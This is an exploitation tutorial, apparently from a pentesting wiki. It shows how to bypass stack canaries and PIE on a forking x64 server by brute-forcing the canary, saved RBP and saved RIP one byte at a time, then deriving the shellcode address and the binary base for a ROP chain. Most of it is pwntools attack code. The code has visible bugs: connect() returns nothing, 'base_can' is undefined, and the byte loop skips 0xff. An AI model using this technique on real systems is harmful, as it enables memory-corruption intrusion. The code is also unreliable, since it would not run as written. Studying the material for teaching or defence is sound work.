# Bypassing Canary & PIE

**If you are facing a binary protected by a canary and PIE \(Position Independent Executable\) you probably need to find a way to bypass them.**

![](../../.gitbook/assets/image%20%28282%29.png)

## Canary

The best way to bypass a simple canary is if the binary is a program **forking child processes every time you establish a new connection** with it \(network service\), because every time you connect to it **the same canary will be used**.

Then, the best way to bypass the canary is just to **brute-force it char by char**, and you can figure out if the guessed canary byte was correct checking if the program has crashed or continues its regular flow. In this example the function **brute-forces an 8 Bytes canary \(x64\)** and distinguish between a correct guessed byte and a bad byte just **checking** if a **response** is sent back by the server \(another way in **other situation** could be using a **try/except**\):

```python
from pwn import *

def connect():
    r = remote("localhost", 8788)

def get_bf(base):
    canary = ""
    guess = 0x0
    base += canary

    while len(canary) < 8:
        while guess != 0xff:
            r = connect()

            r.recvuntil("Username: ")
            r.send(base + chr(guess))

            if "SOME OUTPUT" in r.clean():
                print "Guessed correct byte:", format(guess, '02x')
                canary += chr(guess)
                base += chr(guess)
                guess = 0x0
                r.close()
                break
            else:
                guess += 1
                r.close()

    print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
    return base
    
canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary
```

## PIE

In order to bypass the PIE you need to **leak some address**. And if the binary is not leaking any addresses the best to do it is to **brute-force the RBP and RIP saved in the stack** in the vulnerable function.  
For example, if a binary is protected using both a **canary** and **PIE**, you can start brute-forcing the canary, then the **next** 8 Bytes \(x64\) will be the saved **RBP** and the **next** 8 Bytes will be the saved **RIP.**

To brute-force the RBP and the RIP from the binary you can figure out that a valid guessed byte is correct if the program output something or it just doesn't crash. The **same function** as the provided for brute-forcing the canary can be used to brute-force the RBP and the RIP:

```python
print("Brute-Forcing RBP")
base_canary_rbp = get_bf(base_canary)
RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:])
print("Brute-Forcing RIP")
base_canary_rbp_rip = get_bf(base_canary_rbp)
RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:])
```

### Get base address

The last thing you need to defeat the PIE is to calculate **useful addresses from the leaked** addresses: the **RBP** and the **RIP**.

From the **RBP** you can calculate **where are you writing your shell in the stack**. This can be very useful to know where are you going to write the string _"/bin/sh\x00"_ inside the stack. To calculate the distance between the leaked RBP and your shellcode you can just put a **breakpoint after leaking the RBP** an check **where is your shellcode located**, then, you can calculate the distance between the shellcode and the RBP:

```python
INI_SHELLCODE = RBP - 1152
```

From the **RIP** you can calculate the **base address of the PIE binary** which is what you are going to need to create a **valid ROP chain**.  
To calculate the base address just do `objdump -d vunbinary` and check the disassemble latest addresses:

![](../../.gitbook/assets/image%20%2818%29.png)

In that example you can see that only **1 Byte and a half is needed** to locate all the code, then, the base address in this situation will be the **leaked RIP but finishing on "000"**. For example if you leaked _0x562002970**ecf**_ the base address is _0x562002970**000**_

```python
elf.address = RIP - (RIP & 0xfff)
```



